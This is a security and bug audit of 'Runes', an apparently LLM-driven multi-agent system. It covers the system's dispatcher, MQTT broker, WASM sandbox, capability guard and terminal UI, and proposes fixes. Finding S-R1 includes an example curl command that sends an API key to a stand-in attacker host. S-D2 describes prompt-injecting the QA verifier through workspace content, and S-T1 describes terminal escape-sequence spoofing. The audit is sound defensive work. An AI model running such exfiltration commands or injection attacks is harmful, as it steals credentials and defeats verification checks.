# Runes Code Review — Flaws & Proposed Enhancements

**Scope:** full codebase audit by six parallel reviewers — `lib/runes/core/dispatcher.rb` (+ its Guard/VMManager interactions), `llm_client.rb` + `plan_parser.rb`, `settings.rb` + `tool_registry.rb`, `mqtt/broker.rb`, `wasm/vm_manager.rb` + `capabilities/guard.rb`, and `bin/runes`, `bin/runes-client`, `bin/runes-daemon`, `bin/runes-replay`, `tools/echo`. **Date:** 2026-09-07.

**Executive summary.** The audit surfaced **49 bugs** (6 HIGH, 21 MEDIUM, 22 LOW) and **22 security findings** (3 HIGH, the rest MEDIUM/LOW), beyond the documented accepted limitations (no broker auth, `run_command` denylist weakness, symlink TOCTOU, one-shot plans, in-memory sessions — not re-listed). The most severe themes: the dispatcher's claim/lease protocol can duplicate or permanently wedge work (invalid `request_id` handling, stale claims, same-agent duplicate execution); the embedded MQTT broker can self-deadlock on retained delivery and can be pinned forever by a truncated packet body; the WASM guest has no wall-clock limit and can starve the size-1 VM pool; provider API keys loaded into `ENV` are inherited by `run_command` child shells (credential exfiltration); and the TUI prints raw broker payloads, enabling terminal escape-sequence injection. Long-running daemons also leak memory across several unbounded structures.

---

## Bugs

### Dispatcher (`lib/runes/core/dispatcher.rb`)

- **D1 — HIGH — Invalid `request_id` breaks the claim protocol → duplicate execution by every agent.** `:400-402` + `:1183-1188`. `broadcast_request_id` runs the client-supplied id through `sanitize_request_id`, which generates a *fresh random id* when the id fails `REQUEST_ID_RE` (>32 chars, dots, etc.). Every dispatcher generates a different id, claims a different `runes/prompts/<rid>/claim` topic, wins its own one-agent race, and executes. Trigger: `{"request_id": "my.req.1", "prompt": "..."}` → N agents, N executions. Also silently disables `recently_executed?` dedup. *Fix:* derive a deterministic digest (like `prompt_digest_id`) instead of a random fallback.
- **D2 — HIGH — Stale claims are never evicted; a crashed lease-winner permanently wedges a session.** `:105, 418-432`. `@claims` is append-only. For conversational leases (`session-<lease_id>`, `:312-321`), if the lexicographically-smallest agent crashes, its claim remains in every survivor's list forever, so `claims.min != @agent_id` for all of them and every subsequent turn of that goal/plan session stands down permanently. Also pollutes broadcast races when a `request_id` is legitimately reused after `EXEC_TTL_S`. *Fix:* clear `@claims[key]` when the race resolves, or timestamp claims and ignore ones older than the window.
- **D3 — MEDIUM — `@claims` and `@executed` are unbounded memory leaks.** `:105-107, 441-454`. `@executed` entries are removed only when the *same* id recurs past the TTL; unique ids accumulate for the process lifetime. `@claims` grows one entry per prompt/session-lease forever. *Fix:* periodic sweep or LRU cap.
- **D4 — MEDIUM — Concurrent duplicate prompts execute twice on the same agent.** `:373-393`. `recently_executed?` is checked at `:376`, but `mark_executed` runs only *after* the `sleep claim_window` at `:388`. Two identical prompts within the window spawn two worker threads that both pass dedup, both win the claim, both execute → duplicate side-effects on one dispatcher. *Fix:* atomic check-and-mark (or an in-progress set) before the claim window.
- **D5 — MEDIUM — MQTT tool requests run inline on the reactive loop and can stall it 10s+.** `:244-247` (`route`) → `:1298` (`handle_tool_request`). Unlike prompts, tool requests bypass `dispatch_prompt`; a builtin `run_command` blocks the single `client.get` loop up to `RUNES_CMD_TIMEOUT_S`, delaying claim recording and all routing. Same issue in the "backpressure" inline fallback at `:268-271`. *Fix:* dispatch tool requests to the worker pool too.
- **D6 — MEDIUM — Builtin tools are unreachable via the MQTT tool-request path.** `:1298-1311` + `lib/runes/capabilities/guard.rb:17-21, 44-53`. `handle_tool_request` checks `allowed?(tool_id, :mqtt_publish, ...)`, but `BUILTIN_BASELINE` grants builtins only `fs_write`/`fs_read`/`exec`; the `mqtt_publish` lookup falls to `allow_by_default?` → false → always "capability denied". The `BUILTIN_TOOLS.include?` branch at `:1307` is dead code unless a policy file adds the grant. *Fix:* either add `mqtt_publish` to the baseline or remove the dead branch.
- **D7 — MEDIUM — Mission sidecar write is non-atomic; crash corrupts resume state.** `:1045-1051`. `save_mission` does a direct `File.write`; a crash/SIGINT mid-write leaves truncated JSON, `load_mission` returns nil, and the mission is permanently unusable — defeating crash-resume. *Fix:* tmp file + `File.rename`. (`write_artifact` at `:1151-1160` has the same non-atomicity plus a same-second filename-collision edge — low.)
- **D8 — LOW — `/done` without a client-supplied `session_id` can never finalize.** `:656-666`. A fresh random sid is generated, so `finalize_epic` looks up a nonexistent session and always replies "No goal session to finalize". One-shot CLI flows are broken unless they thread the sid.
- **D9 — LOW — `@latest_mission` not reloaded at boot; dead code in `resolve_mission_path`.** `:1009-1019, 112`. `@latest_epic` is restored from disk but `@latest_mission` starts nil, so `/build latest` fails after a daemon restart. Line `:1013` is unreachable (`:1011` already returned). *Fix:* add `load_latest_mission`, drop the dead line.
- **D10 — LOW — `handle_delegated_task` builds a publish topic from unsanitized envelope fields.** `:494-502`. `env['from']` and `env['request_id']` are interpolated into the reply topic without `REQUEST_ID_RE` validation; a `from` containing `/` or `#` produces an invalid/wildcard topic (gem raises; with a cooperating broker, reply injection). *Fix:* validate both fields.
- **D11 — LOW — Envelope detection inconsistency (`lstrip`).** `:534` (`parse_envelope` uses `lstrip.start_with?('{')`) vs `:1166` (`parse_prompt_payload` uses `start_with?('{')`). A whitespace-prefixed JSON envelope is treated as an envelope for routing but as a plain prompt for id derivation → claim race on a digest id while progress/replies use the envelope id; correlation breaks. *Fix:* one canonical parser.

### LLM client & plan parser (`llm_client.rb`, `plan_parser.rb`)

- **L1 — MEDIUM — Brace-depth scanner is string-blind; plans with unbalanced braces in strings silently vanish.** `plan_parser.rb:31-46`. `try_parse_json` counts `{`/`}` without tracking string literals; a `}` inside a string value (CSS, template literals) closes depth early, `JSON.parse` raises, rescue returns nil, legacy parser finds no `TOOL:` markers and returns `[]` — dispatcher reports success with zero steps. Trigger: `write_file` step whose content contains `body { margin: 0 }`.
- **L2 — MEDIUM — String-encoded `args` that fail to parse are silently replaced with `{}`.** `plan_parser.rb:58-59`; same defect in tool-calls path at `llm_client.rb:356` (`safe_parse_json(...) || {}`). Malformed/truncated `args` (e.g. model hits `max_tokens` mid-arguments) produce a plausible-looking step with empty args, executed without warning; failure surfaces only as a detached downstream guard/tool error.
- **L3 — MEDIUM — `HTTP_TIMEOUT_S` evaluated at load time; malformed env crashes boot.** `llm_client.rb:22`. `Integer(ENV['RUNES_LLM_TIMEOUT_S'] || 180)` runs at require time: `RUNES_LLM_TIMEOUT_S=abc` kills the daemon during boot, and the value is frozen so tests/settings can never adjust it.
- **L4 — MEDIUM — Retry reuses a possibly-poisoned persistent connection after read timeout.** `llm_client.rb:378-392`. After `Net::ReadTimeout`, the same `Net::HTTP` and request object are reused; a late response from the timed-out attempt can be consumed as the retry's response, yielding a garbled body. *Fix:* fresh connection per attempt.
- **L5 — LOW — `@notices` grows unboundedly and is exposed without its lock.** `llm_client.rb:69-75, 307-317`. `attr_reader :notices` hands out the raw array (data race with appending workers), and notices accumulate for the client's lifetime. *Fix:* bound the array, return a dup under the mutex.
- **L6 — LOW — Legacy text parser truncates multi-line JSON ARGS to one line.** `plan_parser.rb:72`. `/^\s*ARGS:\s*(.+?)\s*$/im` is lazy and `$` matches line boundaries, so multi-line args blobs are cut after the first line, fail `JSON.parse`, and degrade to `{'_raw' => ...}` with no error.
- **L7 — LOW — `chat()` with a non-Array `messages` fails confusingly.** `llm_client.rb:108, 142`. `Array(messages)` on a Hash yields key/value pairs; `m['role']` raises `TypeError`, reported by the blanket rescue as a provider failure.

### Settings & tool registry (`settings.rb`, `tool_registry.rb`)

- **R1 — MEDIUM — SQLite busy-timeout 0, no WAL: multi-process contention crashes on lock.** `settings.rb:17`. Default `SQLite3::Database.new` raises `SQLite3::BusyException` immediately on any concurrent write (daemon + `runes` CLI). *Fix:* `@db.busy_timeout = 5000` and `PRAGMA journal_mode=WAL`.
- **R2 — MEDIUM — TOCTOU in `safe_load_json`.** `tool_registry.rb:62-64`. `File.file?` then `File.read` is a check-then-use race; a tool dir entry removed mid-scan raises uncaught `Errno::ENOENT`/`EACCES`, crashing `ToolRegistry.new` (and thus `Dispatcher.new`). Only `JSON::ParserError` is rescued. *Fix:* drop the pre-check, rescue `SystemCallError` around the read.
- **R3 — MEDIUM — Constructor does unguarded writes on every instantiation.** `settings.rb:19`. `seed_defaults` runs unconditionally; read-only consumers fail in the constructor if the DB isn't writable, and every boot performs up to 3 unneeded write transactions. *Fix:* defer seeding to first `set`, or wrap in a transaction with graceful skip on `SQLite3::ReadOnlyException`.
- **R4 — LOW — Stale `default_model` after provider switch.** `settings.rb:75-78`. Seeding is keyed on key absence; after `set('default_provider', 'synthetic')` the old `default_model` persists and `LLMClient.resolve_model` (`llm_client.rb:256-269`) silently re-derives — DB state lies and re-seeds incorrectly on a fresh rebuild. *Fix:* couple the keys or re-derive on provider change.
- **R5 — LOW — Unused/misleading constants and requires.** `settings.rb:10-12` (`DB_PATH`/`ENV_PATH` computed but never used — can drift from behavior), `settings.rb:3` (`pathname`), `tool_registry.rb:2` (`digest` — suggests an unimplemented manifest-integrity hash; see S-R3 enhancements).

### MQTT broker (`lib/runes/mqtt/broker.rb`)

- **M1 — HIGH — Programmatic `subscribe` runs the user block under the global mutex → self-deadlock.** `:62-66`. Retained messages are delivered via the subscriber's block *inside `@mutex.synchronize`*, violating the rule `wire_and_retain` (`:263`) explicitly follows ("a callback that publishes back must not deadlock"). Trigger: an in-process subscriber whose block calls `broker.publish(...)` deadlocks the broker permanently on the first retained message. *Fix:* snapshot retained under the lock, deliver after releasing it (mirror `handle_subscribe`, `:243-249`).
- **M2 — HIGH — Declared packet length lets a client hang a handler thread forever.** `:126`. `io.read(length)` blocks with no timeout; `IO.select` (`:137`) only guarantees the first byte and keepalive never applies mid-read. A client declaring 1 MB then going silent pins the thread indefinitely; repeated → unbounded stuck threads. *Fix:* time-boxed or non-blocking body reads against a deadline. (Also security finding S-M3.)
- **M3 — MEDIUM — QoS 1/2 PUBLISH payloads are corrupted and never acked.** `:252-260`. `handle_publish` ignores QoS bits; the 2-byte packet identifier is treated as body (subscribers get garbage-prefixed payloads) and no PUBACK/PUBREC is sent (client retries/hangs). The broker advertises QoS 0 but silently mangles rather than rejects. *Fix:* parse the packet id and PUBACK, or drop the client.
- **M4 — MEDIUM — LWT silently dropped when a client is detected dead via write failure.** `:305-314`. Dead-subscriber cleanup deletes `@wills[sub]`; the client's own `ensure` (`:342`, from `:164`) then finds no will and the Last Will is never published — precisely the failure mode LWT exists for. *Fix:* don't delete the will there; let the thread's `ensure` fire it.
- **M5 — MEDIUM — One raising in-process callback unsubscribes it from *all* filters, silently.** `:300-313`. A single exception puts the wrapper in `dead` and cleanup removes it from every filter — for a dispatcher agent, silently lost work claims. *Fix:* at minimum log it; arguably only remove from the filter being delivered, or not at all on transient errors.
- **M6 — MEDIUM — SUBACK remaining length overflows for >~125 granted entries.** `:239`. `[body.bytesize].pack('C')` encodes remaining length as one byte; `encode_remaining_length` (`:95`) exists but is unused here. A ≥126-filter SUBSCRIBE (allowed by the parser) yields a malformed SUBACK. *Fix:* use `encode_remaining_length` or reject oversized lists.
- **M7 — LOW — Retained messages can be delivered twice on subscribe.** `:233` registers the filter, `:243` snapshots retained; a retained PUBLISH between the two fans out live *and* appears in the snapshot. *Fix:* snapshot under the same lock that registers.
- **M8 — LOW — Keepalive 0 is overridden to 30 s.** `:178`. Per MQTT 3.1.1, keepalive 0 means "no timeout"; compliant clients get disconnected after 45 s of quiet. Honor 0 or document the deviation.
- **M9 — LOW — Malformed remaining-length encoding not rejected.** `:115-122`. If all 4 length bytes carry the continuation bit, the bogus accumulated length is used; the spec mandates dropping the connection on a 5th byte.
- **M10 — LOW — PUBLISH topics containing wildcards accepted.** `handle_publish` (`:252`) never validates; `+`/`#` in topic names pollute `@retained` and match filters oddly. Reject or drop.
- **M11 — LOW — Dead check in `read_packet`.** `:110`: `header.empty?` — `IO#read(1)` never returns an empty string (nil on EOF); harmless dead code.

### WASM & capability guard (`vm_manager.rb`, `guard.rb`)

- **W1 — HIGH — No wall-clock limit on guest execution; worker thread can hang forever.** `vm_manager.rb:69` (`instance.invoke('_start')`). Fuel bounds guest compute but WASI host calls (e.g. `poll_oneoff` sleep) aren't interrupted; no epoch deadline or `Timeout`. A manifest tool whose `run.rb` sleeps blocks the prompt-worker indefinitely, and `dispatcher.rb:1342` (`@vm_manager.acquire`) then starves the size-1 pool (`Queue.pop` blocks at `vm_manager.rb:110`), hanging all subsequent manifest-tool execution. *Fix:* epoch-interruption deadline per run.
- **W2 — MEDIUM — Silent mock fallback contradicts explicit `backend: :real`.** `vm_manager.rb:119`. `resolve_backend` returns `:mock` when the wasm file is missing for *any* backend value, with no `boot_error` and no `warn` (despite the comment at `:122-123` promising surfaced boot errors). `VMManager.new('typo.wasm', backend: :real)` silently yields a mock that never executes code.
- **W3 — MEDIUM — Malformed fragment crashes `Guard.new` instead of failing closed.** `guard.rb:40`. `@policy['tools'][tool].merge(rules || {})` assumes `rules` is a Hash; `{"tools": {"x": ["#"]}}` raises `NoMethodError` out of `initialize` (`dispatcher.rb:97`), killing dispatcher boot. The constructor has none of `allowed?`'s defensive rescue.
- **W4 — LOW — `release` is unchecked: double-release/foreign-object release corrupts the pool.** `vm_manager.rb:111`. The same VM pushed twice means two concurrent `acquire` callers share one VM (racing on Wasmtime objects). A `with_vm { ... }` wrapper would make this structurally impossible; only the single call site (`dispatcher.rb:1342-1348`) currently uses `ensure` correctly.
- **W5 — LOW — Output truncation at 512 KiB is silent and indistinguishable from success.** `vm_manager.rb:24, 57-58`. Over-`BUFFER_CAPACITY` output is truncated and `run` still returns `ok: true` with no flag; `dispatcher.rb:1344` reports a misleadingly complete result.
- **W6 — LOW — Mock backend reports success for everything.** `vm_manager.rb:97-99`. `mock_run` always returns `ok: true` and the `STDIN.read` rewrite (`dispatcher.rb:1341`) is meaningless under mock; combined with W2 an operator can unknowingly run a fully fake pipeline.

### CLI / TUI / tools (`bin/*`, `tools/`)

- **T1 — HIGH — `/done` completes on *any* `epic_written`, not the matching request.** `bin/runes:139-148`. The branch clears `@mode`/`@session_id`/`@pending_done_req` without checking `req == @pending_done_req` (the error branch at `:168` does compare — inconsistent). With the wildcard `runes/prompts/+/progress` subscription, any agent finishing any goal session (second TUI, `runes-client --mode goal`, late event) flips this TUI to build mode and orphans its session.
- **T2 — MEDIUM — Race between `/done` publish and `@pending_done_req` assignment.** `bin/runes:407-408`. Publish happens before the pending id is set; a fast finalize's `epic_written` can arrive while it's still nil (masked today by T1, a real lost-completion once T1 is fixed). *Fix:* set the pending id under the lock before publishing.
- **T3 — MEDIUM — `publish_envelope` swallows all publish failures and returns nil.** `bin/runes:475-483`. Bare `rescue StandardError`: `/done` against a dead broker leaves the user "waiting for the epic…" forever; failed `/goal`/`/plan` still flips local mode state (`@mode = :goal` at `:397` precedes the publish). *Fix:* surface "publish failed", roll back optimistic mode changes.
- **T4 — MEDIUM — Reader thread death kills the TUI silently; no reconnect.** `bin/runes:95-113`. Any broker hiccup raises out of `client.get`, is swallowed, and `ensure stop` terminates input/draw threads — the TUI exits with "bye." as if the user quit. *Fix:* reconnect-with-backoff or at least a "connection lost" notice.
- **T5 — LOW — Registry tools column overflows into the Traffic panel.** `bin/runes:546`. Tools text at column `half - 1` + up to 30 chars overruns the Traffic panel at width 80; the agent id is never truncated either. Clamp the row to `half - 1`.
- **T6 — LOW — `runes-replay` reuses original `request_id`s.** `bin/runes-replay:45`. Within `execution_ttl` the replay is silently deduped ("Replay published." prints regardless); after the TTL, replays and originals are indistinguishable in the journal. *Fix:* fresh `request_id` per replay (optionally record `replayed_from`).
- **T7 — LOW — `runes-replay -n` accepts negative values.** `bin/runes-replay:16,30`. `-n -5` → `entries.last(-5)` raises unhandled `ArgumentError`. Validate `>= 0`.
- **T8 — LOW — `runes-client --agent` interpolates the id into a topic unvalidated.** `bin/runes-client:91,96`. An id containing `+`/`#`/`/` produces wildcard/malformed topics. Sanitize like the dispatcher's `sanitize_request_id`.
- **T9 — LOW — `bin/runes-daemon` requires `async` but never uses it.** `bin/runes-daemon:2`. Dead weight, or load-bearing only by accident — drop it or note why.

---

## Security findings

*(Excludes the documented accepted limitations: no broker auth, `run_command` denylist weakness, symlink TOCTOU, one-shot plans, in-memory sessions.)*

### Dispatcher

- **S-D1 — MEDIUM — Containment checks use `start_with?` without a path separator.** `dispatcher.rb:574` (`valid_epic_path?`), `:1028` (`valid_mission_path?`). A sibling directory extending the prefix (`docs/missions-evil/x.md`) passes containment, so a client can point mission/epic loaders outside `docs/missions/` (an LLM step can create such a dir via `run_command`, which is not workspace-confined). `safe_path` does this correctly (`root + File::SEPARATOR`); match it.
- **S-D2 — MEDIUM — Verifier is prompt-injectable via workspace content.** `dispatcher.rb:1098-1112` (`verify_mission_step`). The QA verdict is parsed with `extract_json_object` (first balanced `{...}`) over a reply that includes up to 2000 chars of tool output — workspace content (possibly LLM-written) can inject instructions to flip the verdict to `pass`, auto-approving acceptance criteria. *Mitigation:* require the whole reply to parse as JSON or put the verdict on a fixed final line; treat parse ambiguity as fail.
- **S-D3 — LOW — Sensitive prompt content persisted in plaintext journal + retained MQTT message.** `dispatcher.rb:1224-1241`. First 2000 chars of every prompt (possible pasted secrets) go to `log/journal.jsonl` and a *retained* `runes/_log/prompts/latest` topic visible to any subscriber. Worth a doc note or redaction hook.
- **S-D4 — LOW — Guard `allowed?` falls back to `default_allow` when a known tool's action key is missing.** `guard.rb:50-51`. `return allow_by_default? if patterns.nil? || patterns.empty?` — with `default_allow: true`, a typo'd/missing action key silently grants. Fail-closed for known tools with missing actions would be safer.

### LLM client & plan parser

- **S-L1 — MEDIUM — Provider error bodies interpolated verbatim and republished over MQTT.** `llm_client.rb:344-345`, published by `dispatcher.rb:602-603` and written to the durable log. A hostile/compromised provider endpoint can inject arbitrarily large or crafted content into every subscriber and the journal. Truncate (~500 chars) and sanitize control characters.
- **S-L2 — MEDIUM — Silent cross-provider fallback can route prompts to an unintended third party.** `llm_client.rb:244-249`. If the configured provider's key is missing/expired, prompts silently go to any other keyed provider; only a log notice marks it. Warrants an opt-out (`RUNES_ALLOW_PROVIDER_FALLBACK=0`) or hard failure when a provider was explicitly requested.
- **S-L3 — LOW — Unbounded `JSON.parse` on untrusted planner output.** `plan_parser.rb:47`, `llm_client.rb:464-468`. No size/nesting cap; Net::HTTP buffers the full body (`llm_client.rb:341`). Cheap to bound.

### Settings & tool registry

- **S-R1 — HIGH — API keys in process ENV are inherited by `run_command` child shells.** `settings.rb:16` (`Dotenv.load` injects provider keys) + `dispatcher.rb:1495` (`Open3.popen3` with no env scrubbing). An LLM-planned `run_command` like `curl https://evil.example?k=$SYNTHETIC_API_KEY` (or `env` piped anywhere) exfiltrates provider credentials; the sanitizer blocks metachars only on some paths. *Fix:* pass a scrubbed env to `popen3`, or stop loading secrets into global ENV.
- **S-R2 — MEDIUM — Tool manifest fragments can weaken builtin Guard policy.** `guard.rb:16, 25-29, 39-40`. Merge order is baseline < policy file < tool fragments with a shallow per-tool merge, so `tools/run_command/capabilities.json` **overrides the builtin baseline for `run_command`** — any manifest dropped into `tools/` can relax a default-deny builtin. Same trust domain as `config/policy.json`, but nothing warns of the downgrade. *Fix:* fragments additive-only for builtin names, or a loud warning on override.
- **S-R3 — LOW — Unbounded JSON parsing of manifest files.** `tool_registry.rb:64`. No size cap and default `max_nesting` (100) — a hostile/accidental huge or deeply nested `card.json` is a boot-time memory/CPU DoS. *Fix:* `File.read(path, MAX)` + `max_nesting: 32`.
- **S-R4 — LOW — No path/symlink validation on scanned tool dirs.** `tool_registry.rb:42-44`. Symlinked dirs under `tools/` are followed, loading manifests (and `run.rb` per `dispatcher.rb:1330`) from outside the project tree. *Fix:* `File.realpath` containment check.

### MQTT broker

- **S-M1 — MEDIUM — Retained-store eviction enables stored-state wiping.** `broker.rb:277-279`. The cap evicts the *oldest* retained entry; any client can publish 1000 garbage-topic retained messages and evict every legitimate retained message (agent cards, lease state). *Mitigation:* per-topic-prefix quotas, LRU-on-read, or refuse new topics while allowing updates to existing ones.
- **S-M2 — MEDIUM — Unbounded resource consumption outside the packet cap.** No limit on connections (one thread each, `:43`), subscriptions per client (`:233`), or filters per SUBSCRIBE. A localhost peer can exhaust threads/memory without exceeding `MAX_PACKET_BYTES`. Add connection and per-client subscription caps.
- **S-M3 — LOW — Slow-loris body starvation.** See bug M2 — the declared-length blocking read is also a thread-pinning security issue.

### WASM & capability guard

- **S-W1 — HIGH — Default workspace preopen grants the guest read+write over the entire CWD.** `vm_manager.rb:104` (`workspace || Dir.pwd`) + `:91` (`:all`/`:all`). Any caller omitting `workspace:` hands the untrusted guest full RW access to the project root — including `config/.env` (API keys), `runes.db`, and source. The dispatcher passes its sandbox, but the library default is fail-open. *Fix:* default to no preopen, or read-only.
- **S-W2 — MEDIUM — `BUILTIN_BASELINE` makes the "default-deny" guard permissive out of the box.** `guard.rb:17-21`. Baseline grants `fs_write: ['#']`, `fs_read: ['#']`, `exec: ['#']`, and shipped `config/policy.json` has `"tools": {}` — the Guard never denies a builtin action; the only real boundaries are `safe_path` and the (accepted-weak) denylist. The Guard is advertised as default-deny but, as configured, is allow-all for the dangerous tools. Make the baseline opt-in or document the guard as inert without per-tool narrowing.
- **S-W3 — MEDIUM — Manifest tools execute without any `allowed?` check.** The Guard is consulted only for builtins (`dispatcher.rb:1360,1366,1373`) and MQTT tool-request topics (`:1300`). `execute_manifest_tool` (`dispatcher.rb:1329-1350`, reachable via planner steps at `:1317`) never calls `@guard.allowed?` — declared capabilities are merged into policy but never enforced; any plan step naming a registered tool runs it unconditionally.
- **S-W4 — LOW — `'#'` matches the empty topic.** `guard.rb:95-96`. `return true if filter == '#'` runs before the empty-topic check, so `allowed?(t, a, '')` succeeds under a `'#'` grant, defeating the fail-closed check below.

### CLI / TUI

- **S-T1 — HIGH — Terminal escape-sequence injection from untrusted broker payloads.** `bin/runes:127, 129, 132, 138, 141, 151, 155, 159, 165`. MQTT payloads and topic-derived ids are printed raw in `compose_frame`; the `\s+` squash does not strip `\e`/C0 controls. Any local process (broker is unauthenticated) can publish to `runes/agents/<id>/status` or `runes/prompts/+/progress` with ANSI payloads: rewrite the screen, spoof "todo PASSED" lines, or (with OSC 52/8) write the clipboard / plant clickable links. *Fix:* strip control chars (`gsub(/[\x00-\x08\x0b-\x1f\x7f]/, '')`) at the `handle_event` boundary, including `agent_id` (MQTT topic names permit control chars and `[^/]+` captures them).
- **S-T2 — LOW — Unbounded retained payload per agent status; unbounded agent count.** `bin/runes:126`. Full status payloads stored with no size cap; a hostile publisher can mint unlimited agent ids via `runes/agents/<x>/card` (the 200-entry cap applies only to `@traffic`). Truncate status and cap agent count/tools length at ingestion.
- **S-T3 — INFO — `tools/echo/run.rb` arg parsing relies on textual `STDIN.read` rewriting.** `tools/echo/run.rb:6-13`. Any refactor (`$stdin.read`, `STDIN.gets`) silently breaks the tool (blocks on empty stdin / reads garbage). A warning comment exists; consider an assertion or real-pipe injection. No change required in the file.

---

## Proposed enhancements

### Dispatcher
- **Claim lifecycle cleanup (high value):** delete `@claims[key]` and expire `@executed` after race resolution; ignore claim messages older than the window. Fixes D2/D3 and makes lease recovery automatic after crashes. Consider a retained "lease held by X" message for cross-restart stickiness.
- **One parse path:** unify `parse_envelope`/`parse_prompt_payload` into a single envelope parser returning a struct — eliminates D11 and duplicate id logic.
- **Atomic artifact/sidecar writes:** tmp-file + rename for `save_mission`/`write_artifact`; unique suffix on artifact basenames to kill same-second collisions (D7).
- **Worker-pool everything off the loop:** route tool requests through the worker pool (D5), protecting claim timing under load.
- **Session `opened_at` semantics:** track `last_turn_at` and skip LRU eviction for sessions whose mutex is held — today a session evicted mid-conversation (32-session LRU) silently loses history.
- **Dead code & polish:** remove `already_executed?` (`:434`, unused), the no-op `set_last_will` (`:172`), and the dead branch in `resolve_mission_path` (D9); add `load_latest_mission`.
- **`run_confined` edge hardening (`:1479-1525`):** join/kill collector threads on the timeout path instead of relying on pipe-close `IOError`; guard `finished.value` when post-kill `join(1)` returns nil.
- **VMManager observability:** surface `boot_error` on the agent card (currently only `backend.to_s` at `:198`), and mark mock results explicitly so demos don't masquerade as executions.

### LLM client & plan parser
- **Delete dead prompt methods:** `goal_system_prompt`/`mission_system_prompt` (`llm_client.rb:422-462`) are shadowed by the constants (`:475-494`) the dispatcher actually uses (`dispatcher.rb:1122,1142`) and have already diverged.
- **`KNOWN_TOOLS` is unused** (`plan_parser.rb:13`): validate parsed tool names against it (warn/drop unknown tools before the guard) or remove it.
- **Honor `Retry-After` on 429** (`llm_client.rb:389`) instead of only fixed 0.5/1/2s backoff.
- **Check `finish_reason`** (`llm_client.rb:348-365`): surface `length`-truncated responses as an error/notice so a corrupt plan becomes actionable (mitigates L2).
- **Add `write_timeout`** (`llm_client.rb:329-330`) — only read/open timeouts are set; a stalled large upload can hang.
- **Structured parse errors from PlanParser:** a `Result(steps:, warnings:)` shape or strict mode, so dropped steps (L1/L2/L6) are distinguishable from an empty plan.
- **Per-attempt timeout accounting:** 4 attempts × 180s can block a worker ~12 minutes; cap total deadline or scale timeout down on retries.

### Settings & tool registry
- **Wrap `seed_defaults` in one transaction** — atomic and cheap.
- **Make `Settings` thread-safe** — `SQLite3::Database` isn't; `Dispatcher` shares one Settings across workers (`dispatcher.rb:82`). Add a mutex around `get`/`set` or document one-per-thread.
- **`Dotenv.load` is order-dependent** — with `root:` overrides, the first instance wins and later roots silently inherit its values. Memoize per path or use `Dotenv.overload` deliberately.
- **Make `ToolRegistry` rescan-able** — a `rescan` method rebuilding `@cards`/`@policy_fragment` (plus a Guard hook) enables hot tool loading without restart.
- **Use `digest` for manifest integrity** — hash `capabilities.json` and log/flag changes at boot to catch silent policy drift.
- **Skip non-tool entries early in scan** — sorted iteration plus a safe-charset check on tool names keeps names from becoming unsafe MQTT topic segments downstream.

### MQTT broker
- **UNSUBSCRIBE support (wire and programmatic):** there is no way to unsubscribe; in-process wrappers accumulate for the broker's lifetime. A `broker.unsubscribe(wrapper)` fixes the leak.
- **De-duplicate fan-out targets** (`:285-289`): overlapping filters (`a/#`, `a/b`) deliver duplicates; `targets.uniq!` before delivery.
- **Log dead-subscriber removals and disconnect paths** (`:305-314`) — silent today; a `warn` would have made M4/M5 observable.
- **Don't expose `@retained` raw** (`attr_reader :retained`, `:35`) — return a locked `.dup` snapshot.
- **Validate protocol level; CONNACK failures** — reject level ≠ 4 with CONNACK 0x01 (`:211` accepts anything).
- **Parse the client id and tag logs with it** (`:182-185` reads and discards it) — materially helps debugging a multi-agent fabric.
- **Fix stale comment / dead code** (`:85-88`): `TopicCallback#write` is dead; dispatch checks `respond_to?(:deliver)`.
- **Duplicate programmatic subscriptions** (`:60`): same block subscribed twice delivers twice with no undo; dedup or return an idempotent handle.

### WASM & capability guard
- **`with_vm` block API** (`vm_manager.rb`): `acquire`/yield/`ensure release` — structurally removes the W4 corruption class and simplifies the dispatcher call site.
- **Wall-clock deadline per run** via Wasmtime epoch interruption (cleaner than `Timeout`, which can't interrupt stuck native calls) — directly addresses W1.
- **Validate and precompile patterns at merge time** (`guard.rb:39-41`): reject non-Hash rules/non-Array lists and compile patterns to regexes once — fixes W3 and removes per-call regex construction.
- **Structured deny logging** (`guard.rb:54-56` warns only on exceptions): log tool/action/resource on deny so operators can audit guard behavior.
- **Truncation flag in `run` result** (W5): compare output length to `BUFFER_CAPACITY`, add `truncated: true`.
- **Scrub guest output encoding** (`vm_manager.rb:70`): invalid UTF-8 from a guest raises later in `JSON.generate`; `.scrub` at the source.
- **Warn on `attach_workspace` fallback** (`vm_manager.rb:90-94`): both rescue paths are silent; one `warn` naming the binding mismatch saves long debugging.

### CLI / TUI / tools
- **Reuse one MQTT connection for publishing** (`bin/runes:477-479`): connect→publish→disconnect per prompt risks dropping the packet and adds latency; keep a long-lived publisher (the reader's client + write mutex) and publish at QoS 1.
- **Correlate replies to prompts by request id** (`bin/runes:130-132`): keep a `req => prompt-snippet` map so replies render as `reply to "<prompt…>"`.
- **Bound `@history`** (`bin/runes:61,348`): cap at ~500 entries and/or truncate stored entries (64 KB pastes are retained verbatim).
- **Robust bracketed-paste handling** (`bin/runes:270-281`): on cap-hit or dropped terminator, insert what was collected and warn rather than silently swallowing.
- **`runes-replay` journal read efficiency** (`bin/runes-replay:25-30`): `File.readlines` parses the whole journal for the last 20; read the tail backwards (or rely on `JOURNAL_ROTATE_BYTES` making this safe).
- **`runes-client`: show claim/lease progress while waiting** (`bin/runes-client:109-116`): subscribe to `runes/prompts/#{request_id}/progress` so a 180 s plan isn't a silent wait.
- **Extract TUI magic numbers** (`bin/runes:129`, `:276`, `:46`) into a `LIMITS = {...}` block — makes the truncation policy auditable, which matters given S-T1.
- **`bin/runes-daemon`: handle non-Interrupt exceptions with a logged backtrace** (`bin/runes-daemon:21-25`) — `rescue Exception` + `$stderr` log + non-zero exit makes systemd/launchd supervision useful.

---

## Suggested priority order

1. **S-R1 — Scrub child-process env / stop loading API keys into global ENV.** Active credential-exfiltration path through the primary tool (`run_command`); highest impact, small fix.
2. **M1 — Broker `subscribe` self-deadlock.** Permanently wedges the entire broker on a natural in-process pattern (subscriber publishes on retained delivery).
3. **M2/S-M3 — Time-box the broker body read.** One malformed client pins a handler thread forever; repeated → full thread exhaustion.
4. **D1 — Deterministic fallback for invalid `request_id`.** Silently multiplies execution and side-effects across every agent in the fleet.
5. **D2 — Evict stale claims.** A single crashed agent permanently wedges a goal/plan session; no operator recovery short of restarting everything.
6. **W1 — Wall-clock deadline for WASM guests.** One `sleep` in a manifest tool starves the size-1 VM pool and hangs all tool execution.
7. **S-T1 — Sanitize control characters at the TUI event boundary.** Any local process can spoof/rewrite the operator's screen; fix is a one-line filter.
8. **S-W1 — Fail-closed default for the WASM workspace preopen.** The library default currently hands guests RW over the whole project root (including `.env`).
